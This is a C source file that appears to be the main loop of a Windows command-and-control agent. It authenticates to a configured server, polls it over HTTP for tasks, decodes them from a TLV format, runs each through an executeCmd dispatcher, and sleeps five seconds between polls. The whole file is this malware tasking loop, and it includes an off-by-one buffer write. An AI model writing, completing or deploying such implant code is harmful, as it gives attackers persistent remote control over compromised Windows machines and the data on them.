#include <stdio.h>
#include <Lmcons.h>
#include <Windows.h>

#include <types.h>
#include <init.h>
#include <http_client.h>
#include <communication.h>
#include <commands.h>

#include <config.h>

struct Agent agent;

int main() {
  init();
  
  DWORD httpBytesRead;

  struct TLVBuild tasksTLV;
  struct TLVBuild taskTLV;
  struct TLVBuild argsTLV;

  char* tasksBuffer = malloc(1024);

  while (1) {  
    agent.connected = (bool)authenticate();
    
    while (agent.connected) {
      printf("fetching commands..\n");

      if (!httpGet(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer)) {
        agent.connected = false;
        break;
      }
      tasksBuffer[httpBytesRead] = 0x00;

      printf("%s", tasksBuffer);

      tasksTLV = tlvFromBuf(tasksBuffer, httpBytesRead);

      int tasksCount = extractInt32(&tasksTLV);
      extractInt32(&tasksTLV); // size of the tasks buffer, useless for us.

      for (int i = 0; i < tasksCount; i++) {
        int taskId = extractInt32(&tasksTLV);
        
        int taskActionId = extractInt32(&tasksTLV);
        int argBytes = extractInt32(&tasksTLV); 
        char * args = malloc(argBytes + 1);
        extractBytes(&tasksTLV, argBytes, args);
        args[argBytes] = 0x00;

        struct TLVBuild tlvArgs = tlvFromBuf(args, argBytes + 1);
        executeCmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);

        free(args);
      }

      Sleep(5000);
    }
  }

  free(tasksBuffer);

  return 0;
}